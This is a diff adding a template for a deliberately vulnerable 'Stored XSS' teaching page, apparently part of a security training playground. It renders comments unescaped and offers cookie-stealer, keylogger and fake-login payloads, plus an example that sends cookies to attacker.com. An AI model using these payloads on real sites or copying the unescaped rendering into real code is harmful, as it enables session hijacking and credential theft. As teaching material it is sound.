@@ -1,0 +1,431 @@
+{% extends "base.html" %}
+
+{% block title %}Stored XSS Demo - XSS Playground{% endblock %}
+
+{% block content %}
+<div class="container my-5">
+    <!-- Page Header -->
+    <div class="row mb-4">
+        <div class="col-12">
+            <h1 class="display-5 text-danger mb-3">
+                <i class="fas fa-comments me-3"></i>
+                Stored XSS Demonstration
+            </h1>
+            <p class="lead text-muted">
+                Explore how malicious scripts stored in databases can affect all users who view the compromised content.
+            </p>
+        </div>
+    </div>
+
+    <!-- Security Status -->
+    <div class="row mb-4">
+        <div class="col-12">
+            {% if security_mode == 'secure' %}
+                <div class="alert alert-success">
+                    <i class="fas fa-shield-alt me-2"></i>
+                    <strong>Secure Mode:</strong> Comments are being sanitized before display using <code>html.escape()</code>. 
+                    Stored XSS payloads will be rendered harmless.
+                </div>
+            {% else %}
+                <div class="alert alert-danger">
+                    <i class="fas fa-exclamation-triangle me-2"></i>
+                    <strong>Vulnerable Mode:</strong> Comments are displayed without sanitization. 
+                    Stored XSS payloads will execute for all users!
+                </div>
+            {% endif %}
+        </div>
+    </div>
+
+    <div class="row">
+        <!-- Comment Form -->
+        <div class="col-lg-4">
+            <div class="card">
+                <div class="card-header">
+                    <h5 class="card-title mb-0">
+                        <i class="fas fa-plus me-2"></i>
+                        Add Comment
+                    </h5>
+                </div>
+                <div class="card-body">
+                    <form method="POST" action="{{ url_for('stored_xss') }}">
+                        <div class="mb-3">
+                            <label for="username" class="form-label">Username:</label>
+                            <input type="text" 
+                                   class="form-control" 
+                                   id="username" 
+                                   name="username" 
+                                   placeholder="Enter your name"
+                                   required>
+                        </div>
+                        <div class="mb-3">
+                            <label for="comment" class="form-label">Comment:</label>
+                            <textarea class="form-control" 
+                                      id="comment" 
+                                      name="comment" 
+                                      rows="4" 
+                                      placeholder="Enter your comment..."
+                                      required></textarea>
+                            <div class="form-text">
+                                Try entering: <code>&lt;script&gt;alert('Stored XSS')&lt;/script&gt;</code>
+                            </div>
+                        </div>
+                        <button type="submit" class="btn btn-primary w-100">
+                            <i class="fas fa-paper-plane me-2"></i>Post Comment
+                        </button>
+                    </form>
+                </div>
+            </div>
+
+            <!-- Quick Payload Buttons -->
+            <div class="card mt-4">
+                <div class="card-header">
+                    <h6 class="card-title mb-0">
+                        <i class="fas fa-magic me-2"></i>
+                        Quick Test Payloads
+                    </h6>
+                </div>
+                <div class="card-body">
+                    <div class="d-grid gap-2">
+                        <button class="btn btn-outline-warning btn-sm" onclick="insertPayload('alert')">
+                            Alert Box XSS
+                        </button>
+                        <button class="btn btn-outline-warning btn-sm" onclick="insertPayload('cookie')">
+                            Cookie Stealer
+                        </button>
+                        <button class="btn btn-outline-warning btn-sm" onclick="insertPayload('redirect')">
+                            Page Redirect
+                        </button>
+                        <button class="btn btn-outline-warning btn-sm" onclick="insertPayload('keylogger')">
+                            Keylogger Demo
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Management Actions -->
+            <div class="card mt-4">
+                <div class="card-header">
+                    <h6 class="card-title mb-0">
+                        <i class="fas fa-cogs me-2"></i>
+                        Management
+                    </h6>
+                </div>
+                <div class="card-body">
+                    <form method="POST" action="{{ url_for('clear_data') }}" class="d-grid">
+                        <input type="hidden" name="type" value="comments">
+                        <button type="submit" class="btn btn-outline-danger" 
+                                onclick="return confirm('Clear all comments?')">
+                            <i class="fas fa-trash me-2"></i>Clear All Comments
+                        </button>
+                    </form>
+                </div>
+            </div>
+        </div>
+
+        <!-- Comments Display -->
+        <div class="col-lg-8">
+            <div class="card">
+                <div class="card-header d-flex justify-content-between align-items-center">
+                    <h5 class="card-title mb-0">
+                        <i class="fas fa-comments me-2"></i>
+                        Comment Feed ({{ comments|length }} comments)
+                    </h5>
+                    <span class="badge {{ 'bg-success' if security_mode == 'secure' else 'bg-danger' }}">
+                        {{ security_mode.upper() }}
+                    </span>
+                </div>
+                <div class="card-body" style="max-height: 600px; overflow-y: auto;">
+                    {% if comments %}
+                        {% for comment in comments %}
+                        <div class="card mb-3 border-start border-5 {{ 'border-success' if security_mode == 'secure' else 'border-danger' }}">
+                            <div class="card-body">
+                                <div class="d-flex justify-content-between align-items-start mb-2">
+                                    <h6 class="card-title mb-0">
+                                        <!-- Username display - potentially vulnerable -->
+                                        {{ comment.username|safe }}
+                                    </h6>
+                                    <small class="text-muted">{{ comment.timestamp }}</small>
+                                </div>
+                                <div class="card-text">
+                                    <!-- Comment content - this is where stored XSS occurs -->
+                                    {{ comment.comment|safe }}
+                                </div>
+                            </div>
+                        </div>
+                        {% endfor %}
+                    {% else %}
+                        <div class="text-center py-5">
+                            <i class="fas fa-comments fa-3x text-muted mb-3"></i>
+                            <p class="text-muted">No comments yet. Be the first to post!</p>
+                        </div>
+                    {% endif %}
+                </div>
+            </div>
+
+            <!-- Code Example -->
+            <div class="card mt-4">
+                <div class="card-header">
+                    <h6 class="card-title mb-0">
+                        <i class="fas fa-code me-2"></i>
+                        Code Example (Current Mode: {{ security_mode }})
+                    </h6>
+                </div>
+                <div class="card-body">
+                    <pre><code class="language-python small">{% if security_mode == 'secure' %}# SECURE VERSION: Sanitize before display
+for comment in stored_comments:
+    safe_comment = {
+        'username': html.escape(comment['username']),  # Sanitize username
+        'comment': html.escape(comment['comment']),    # Sanitize comment
+        'timestamp': comment['timestamp']
+    }
+    display_comments.append(safe_comment){% else %}# VULNERABLE VERSION: Direct display without sanitization
+for comment in stored_comments:
+    display_comments.append(comment)  # No sanitization - XSS risk!
+
+# In template: {{ comment.comment|safe }}  # Unsafe rendering{% endif %}</code></pre>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Educational Information -->
+    <div class="row mt-5">
+        <div class="col-12">
+            <div class="card border-danger">
+                <div class="card-header bg-danger text-white">
+                    <h5 class="card-title mb-0">
+                        <i class="fas fa-graduation-cap me-2"></i>
+                        Learning Points: Stored XSS
+                    </h5>
+                </div>
+                <div class="card-body">
+                    <div class="row">
+                        <div class="col-md-4">
+                            <h6 class="text-danger">
+                                <i class="fas fa-exclamation-triangle me-2"></i>
+                                How Stored XSS Works:
+                            </h6>
+                            <ul class="small">
+                                <li>Attacker submits malicious script via form</li>
+                                <li>Server stores the payload in database/memory</li>
+                                <li>Script executes for every user who views the content</li>
+                                <li>More dangerous than reflected XSS - affects multiple users</li>
+                                <li>Persistent until data is cleaned</li>
+                            </ul>
+                        </div>
+                        <div class="col-md-4">
+                            <h6 class="text-warning">
+                                <i class="fas fa-bug me-2"></i>
+                                Potential Impact:
+                            </h6>
+                            <ul class="small">
+                                <li>Session hijacking via cookie theft</li>
+                                <li>Credential harvesting through fake forms</li>
+                                <li>Defacement of website content</li>
+                                <li>Malware distribution</li>
+                                <li>Phishing attacks</li>
+                            </ul>
+                        </div>
+                        <div class="col-md-4">
+                            <h6 class="text-success">
+                                <i class="fas fa-shield-alt me-2"></i>
+                                Prevention Methods:
+                            </h6>
+                            <ul class="small">
+                                <li>Input validation and sanitization</li>
+                                <li>Output encoding before display</li>
+                                <li>Content Security Policy (CSP)</li>
+                                <li>Use prepared statements for databases</li>
+                                <li>Regular security audits</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Attack Scenarios -->
+    <div class="row mt-4">
+        <div class="col-12">
+            <div class="card">
+                <div class="card-header">
+                    <h6 class="card-title mb-0">
+                        <i class="fas fa-skull-crossbones me-2"></i>
+                        Common Stored XSS Attack Scenarios
+                    </h6>
+                </div>
+                <div class="card-body">
+                    <div class="accordion" id="attackScenarios">
+                        <div class="accordion-item">
+                            <h2 class="accordion-header">
+                                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#scenario1">
+                                    Session Hijacking
+                                </button>
+                            </h2>
+                            <div id="scenario1" class="accordion-collapse collapse" data-bs-parent="#attackScenarios">
+                                <div class="accordion-body small">
+                                    <strong>Attack:</strong> <code>&lt;script&gt;document.location='http://attacker.com/steal?cookie='+document.cookie&lt;/script&gt;</code>
+                                    <br><strong>Result:</strong> Sends user's cookies to attacker's server, allowing session takeover.
+                                </div>
+                            </div>
+                        </div>
+                        <div class="accordion-item">
+                            <h2 class="accordion-header">
+                                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#scenario2">
+                                    Credential Harvesting
+                                </button>
+                            </h2>
+                            <div id="scenario2" class="accordion-collapse collapse" data-bs-parent="#attackScenarios">
+                                <div class="accordion-body small">
+                                    <strong>Attack:</strong> Inject fake login form that submits to attacker's server
+                                    <br><strong>Result:</strong> Users enter credentials thinking it's legitimate, but data goes to attacker.
+                                </div>
+                            </div>
+                        </div>
+                        <div class="accordion-item">
+                            <h2 class="accordion-header">
+                                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#scenario3">
+                                    Content Manipulation
+                                </button>
+                            </h2>
+                            <div id="scenario3" class="accordion-collapse collapse" data-bs-parent="#attackScenarios">
+                                <div class="accordion-body small">
+                                    <strong>Attack:</strong> <code>&lt;script&gt;document.body.innerHTML='&lt;h1&gt;Site Hacked!&lt;/h1&gt;'&lt;/script&gt;</code>
+                                    <br><strong>Result:</strong> Replaces entire page content, used for defacement or misdirection.
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+// Predefined XSS payloads for different scenarios
+const payloads = {
+    alert: '<script>alert("Stored XSS executed! This could steal your data.")</script>',
+    cookie: '<script>fetch("/log", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({type:"cookie_theft", payload:"document.cookie", cookies:document.cookie, url:window.location.href})}); alert("Cookie stolen: " + document.cookie)</script>',
+    redirect: '<script>setTimeout(function(){alert("Redirecting to malicious site..."); window.location="javascript:alert(\'Malicious redirect blocked by browser\')";}, 2000)</script>',
+    keylogger: '<script>document.addEventListener("keypress", function(e){console.log("Key pressed: " + e.key); fetch("/log", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({type:"keylogger", payload:"keypress", key:e.key, url:window.location.href})});});</script><div style="background:yellow;padding:10px;">Keylogger installed - check console and logs</div>'
+};
+
+// Function to insert predefined payloads
+function insertPayload(type) {
+    if (payloads[type]) {
+        document.getElementById('username').value = 'Attacker';
+        document.getElementById('comment').value = payloads[type];
+        
+        // Show warning
+        if (!confirm('This will insert a ' + type + ' payload. Continue?')) {
+            return;
+        }
+    }
+}
+
+// Log stored XSS payload executions
+document.addEventListener('DOMContentLoaded', function() {
+    // Check if any comments contain script tags (in vulnerable mode)
+    const comments = document.querySelectorAll('.card-text');
+    let scriptCount = 0;
+    
+    comments.forEach(comment => {
+        if (comment.innerHTML.includes('<script>') || comment.innerHTML.includes('onerror=') || comment.innerHTML.includes('onload=')) {
+            scriptCount++;
+        }
+    });
+    
+    if (scriptCount > 0 && '{{ security_mode }}' === 'insecure') {
+        // Log the stored XSS exposure
+        logXSSPayload({
+            type: 'stored_xss_exposure',
+            payload: 'Multiple stored XSS payloads detected',
+            count: scriptCount,
+            url: window.location.href,
+            location: 'Stored XSS Comments'
+        });
+    }
+});
+
+// Function to demonstrate advanced XSS attack
+function demonstrateAdvancedAttack() {
+    if ('{{ security_mode }}' === 'secure') {
+        alert('Advanced attacks are blocked in secure mode.');
+        return;
+    }
+    
+    if (confirm('This will demonstrate an advanced XSS attack. Continue?')) {
+        // Create a fake login form overlay
+        const overlay = document.createElement('div');
+        overlay.style.cssText = `
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            z-index: 9999;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        `;
+        
+        overlay.innerHTML = `
+            <div style="background: white; padding: 20px; border-radius: 10px; color: black;">
+                <h3>Session Expired - Please Login Again</h3>
+                <form onsubmit="alert('Credentials stolen! Username: ' + this.username.value + ', Password: ' + this.password.value); document.body.removeChild(this.parentElement.parentElement); return false;">
+                    <div style="margin: 10px 0;">
+                        <label>Username: <input type="text" name="username" required></label>
+                    </div>
+                    <div style="margin: 10px 0;">
+                        <label>Password: <input type="password" name="password" required></label>
+                    </div>
+                    <button type="submit">Login</button>
+                    <button type="button" onclick="document.body.removeChild(this.parentElement.parentElement)">Cancel</button>
+                </form>
+            </div>
+        `;
+        
+        document.body.appendChild(overlay);
+        
+        // Log the advanced attack
+        logXSSPayload({
+            type: 'advanced_attack',
+            payload: 'Fake login form overlay',
+            url: window.location.href,
+            location: 'Stored XSS Demo'
+        });
+    }
+}
+
+// Add demonstration button in insecure mode
+document.addEventListener('DOMContentLoaded', function() {
+    if ('{{ security_mode }}' === 'insecure') {
+        const managementCard = document.querySelector('.card:last-of-type .card-body');
+        if (managementCard) {
+            const demoButton = document.createElement('button');
+            demoButton.className = 'btn btn-outline-danger mt-2 w-100';
+            demoButton.innerHTML = '<i class="fas fa-skull-crossbones me-2"></i>Demo Advanced Attack';
+            demoButton.onclick = demonstrateAdvancedAttack;
+            managementCard.appendChild(demoButton);
+        }
+    }
+});
+
+// Real-time comment counter
+function updateCommentCount() {
+    const commentCount = document.querySelectorAll('.card-body .card').length;
+    const headerTitle = document.querySelector('.card-header h5');
+    if (headerTitle) {
+        headerTitle.innerHTML = '<i class="fas fa-comments me-2"></i>Comment Feed (' + commentCount + ' comments)';
+    }
+}
+
+// Call update function on page load
+document.addEventListener('DOMContentLoaded', updateCommentCount);
+</script>
+{% endblock %}
